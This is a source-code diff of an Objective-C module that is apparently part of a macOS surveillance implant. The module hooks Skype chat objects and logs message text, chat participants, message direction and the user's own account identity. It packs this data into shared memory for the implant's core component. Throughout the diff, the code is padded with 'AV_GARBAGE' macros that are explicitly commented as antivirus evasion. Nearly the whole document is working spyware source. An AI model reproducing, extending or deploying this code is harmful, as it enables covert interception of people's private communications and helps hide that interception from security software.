@@ -8,13 +8,121 @@
  */
 
 #import "RCSMAgentIMSkype.h"
+#import "RCSMAgentOrganizer.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
 #import "RCSMAVGarbage.h"
 
+#define INCOMING_CHAT   0x01
+#define OUTCOMING_CHAT  0x00
+
 static BOOL gIsSkype2 = YES;
+static BOOL gSkypeContactGrabbed = NO;
+
+void logSkypeContacts(NSString *contact)
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  NSData *firstData   = [@"Skype" dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+  NSData *contactData = [contact dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+  
+  NSMutableData *abData       = [[NSMutableData alloc] init];
+  
+  u_int tag = 0x1 << 24; // firstName
+  tag |= ([firstData length] & 0x00FFFFFF);
+  
+  [abData appendBytes:&tag length:sizeof(u_int)];
+  
+  [abData appendData:firstData];
+  tag = 0x6 << 24; // email address
+  tag |= ([contactData length] & 0x00FFFFFF);
+  
+  [abData appendBytes:&tag length:sizeof(u_int)];
+  [abData appendData:contactData];
+  
+  NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(organizerAdditionalHeader)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  additionalHeader->size    = sizeof(organizerAdditionalHeader) + [abData length];
+  additionalHeader->version = CONTACT_LOG_VERSION_NEW;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  additionalHeader->identifier  = 0;
+  additionalHeader->program     = 0x02; // skype contact
+  additionalHeader->flags       = 0x80000000; // non local (local = 0x80000000)
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  NSMutableData *entryData    = [[NSMutableData alloc] init];
+  
+  [entryData appendData:logHeader];
+  [entryData appendData:abData];
+  
+  [logHeader release];
+  [abData release];
+  
+  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+  
+  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
+  
+  // Log buffer
+  shMemoryHeader->status          = SHMEM_WRITTEN;
+  shMemoryHeader->agentID         = AGENT_CHAT_CONTACT;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  shMemoryHeader->direction       = D_TO_CORE;
+  shMemoryHeader->commandType     = CM_LOG_DATA;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  shMemoryHeader->flag            = 0;
+  shMemoryHeader->commandDataSize = [entryData length];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  memcpy(shMemoryHeader->commandData,
+         [entryData bytes],
+         [entryData length]);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  if ([mSharedMemoryLogging writeMemory: logData
+                                 offset: 0
+                          fromComponent: COMP_AGENT] == TRUE)
+  {
+#ifdef DEBUG_IM_SKYPE
+    verboseLog(@"message: %@", loggedText);
+#endif
+  }
+  else
+  {
+#ifdef DEBUG_IM_SKYPE
+    errorLog(@"Error while logging skype message to shared memory");
+#endif
+  }
+  
+  [logData release];
+  
+  gSkypeContactGrabbed = TRUE;
+}
 
 @implementation mySkypeChat
 
@@ -86,9 +194,14 @@ static BOOL gIsSkype2 = YES;
   
   a++;
   
-  NSArray *_activeMembers;
+  int programType = 0x01; // skype
+  int flags; // 0x01 = chat incoming
+  
+  NSArray         *_activeMembers;
   NSMutableString *activeMembers  = [[NSMutableString alloc] init];
   NSMutableString *loggedText     = [[NSMutableString alloc] init];
+  NSString        *myAccount = @"";
+  NSString        *fromUser  = @"";
   
   // AV evasion: only on release build
   AV_GARBAGE_001
@@ -144,76 +257,82 @@ static BOOL gIsSkype2 = YES;
         { 
           // AV evasion: only on release build
           AV_GARBAGE_001
-        
+          
+          MacContact *fromContact = [message fromUser];
+          
+          if (fromContact != nil)
+            fromUser = (NSString*)[fromContact identity];
+
           int x;
-          
-          for (x = 0; x < [_activeMembers count]; x++)
-            { 
-              // AV evasion: only on release build
-              AV_GARBAGE_000
-            
-              id entry = [_activeMembers objectAtIndex: x];
-              
-              // AV evasion: only on release build
-              AV_GARBAGE_003
-              
-              if ([entry isKindOfClass: [NSString class]])
-                { 
-                  // AV evasion: only on release build
-                  AV_GARBAGE_001
-                
-                  // Skype 2.x NSString entries
-                  [activeMembers appendString: entry];
-                  
-                  // AV evasion: only on release build
-                  AV_GARBAGE_003
-                  
-                }
-              else
-                { 
-                  // AV evasion: only on release build
-                  AV_GARBAGE_006
-                
-                  // Skype 5.x SkypeChatContact entries
-                  [activeMembers appendString: [entry performSelector: @selector(identity)]];
-                  
-                  // AV evasion: only on release build
-                  AV_GARBAGE_006
-                }
-              
-              // AV evasion: only on release build
-              AV_GARBAGE_001
-              
-              // Add a text delimiter in case it's not the last entry
-              if (x != [_activeMembers count] - 1)
-                [activeMembers appendString: @" | "];
-              
-              // AV evasion: only on release build
-              AV_GARBAGE_006
-            }
-          
-          // AV evasion: only on release build
-          AV_GARBAGE_000
           
           //
           // In Skype 5 we don't have ourself inside the chat members list
           //
           if (gIsSkype2 == NO)
+          {
+            id myself = [self performSelector: @selector(myMemberContact)];
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_008
+           
+            myAccount = (NSString*)[myself identity];
+            
+            if (gSkypeContactGrabbed == FALSE)
+              logSkypeContacts(myAccount);
+          }
+          
+          if ([fromUser compare: myAccount] == NSOrderedSame)
+          {
+            flags = OUTCOMING_CHAT;
+          }
+          else
+          {
+            flags = INCOMING_CHAT;
+            
+            [activeMembers appendString: myAccount];
+          }
+          
+          for (x = 0; x < [_activeMembers count]; x++)
+          {
+            // AV evasion: only on release build
+            AV_GARBAGE_000
+            
+            id entry = [_activeMembers objectAtIndex: x];
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            if ([entry isKindOfClass: [NSString class]])
             {
-              id myself = [self performSelector: @selector(myMemberContact)];
-              [activeMembers appendFormat: @" | %@", [myself identity]];
+              // AV evasion: only on release build
+              AV_GARBAGE_001
+
+              if ([activeMembers length] > 0)
+                [activeMembers appendString: @", "];
+              
+              // Skype 2.x NSString entries
+              [activeMembers appendString: entry];
               
               // AV evasion: only on release build
-              AV_GARBAGE_008
-              
+              AV_GARBAGE_003
             }
-
-          // Appending date and time
-          //[loggedText appendFormat: @"%@ ", [message date]];
-
-          // Appending the contact name that sent the message
-          MacContact *fromContact = [message fromUser];
-          [loggedText appendFormat: @"%@: ", [fromContact identity]];
+            else
+            {
+              // AV evasion: only on release build
+              AV_GARBAGE_006
+              if ([activeMembers length] > 0)
+                [activeMembers appendString: @", "];
+              
+              // Skype 5.x SkypeChatContact entries
+              [activeMembers appendString: [entry performSelector: @selector(identity)]];
+                 
+              // AV evasion: only on release build
+              AV_GARBAGE_006
+            }
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_006
+          }
           
           // AV evasion: only on release build
           AV_GARBAGE_009
@@ -244,24 +363,6 @@ static BOOL gIsSkype2 = YES;
     }
 
   // Start logging
-  //NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
-  NSString *_topic            = [self performSelector: @selector(topic)];
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_001
-  
-  NSData *processName = [@"Skype" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_002
-  
-  NSData *topic               = [_topic dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
-  NSData *peers               = [activeMembers dataUsingEncoding: NSUTF16LittleEndianStringEncoding]; 
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_008
-  
-  NSData *content             = [loggedText dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
   
   // AV evasion: only on release build
   AV_GARBAGE_000
@@ -319,17 +420,26 @@ static BOOL gIsSkype2 = YES;
                       length: sizeof (struct tm) - 0x14];
     }
   
-  // Process Name
-  [entryData appendData: processName];
   
   // AV evasion: only on release build
-  AV_GARBAGE_000
+  AV_GARBAGE_002
   
-  [entryData appendBytes: &unicodeNullTerminator
-                  length: sizeof(short)]; 
+  NSData *topic = [fromUser dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+  NSData *peers = [activeMembers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  
   // AV evasion: only on release build
   AV_GARBAGE_008
   
+  NSData *content             = [loggedText dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
+  // Program type
+  [entryData appendBytes:&programType length:sizeof(programType)];
+  
+  // flags
+  [entryData appendBytes:&flags length:sizeof(flags)];
   
   // Topic
   [entryData appendData: topic];
@@ -340,7 +450,25 @@ static BOOL gIsSkype2 = YES;
   [entryData appendBytes: &unicodeNullTerminator
                   length: sizeof(short)];
   
+  // Topic_display
+  [entryData appendData: topic];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  [entryData appendBytes: &unicodeNullTerminator
+                  length: sizeof(short)];
+  
   // Peers
+  [entryData appendData: peers];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  [entryData appendBytes: &unicodeNullTerminator
+                  length: sizeof(short)];
+  
+  // Peers_display
   [entryData appendData: peers];
   
   // AV evasion: only on release build
@@ -371,7 +499,7 @@ static BOOL gIsSkype2 = YES;
   
   // Log buffer
   shMemoryHeader->status          = SHMEM_WRITTEN;
-  shMemoryHeader->agentID         = AGENT_CHAT;
+  shMemoryHeader->agentID         = AGENT_CHAT_NEW;
   
   // AV evasion: only on release build
   AV_GARBAGE_006
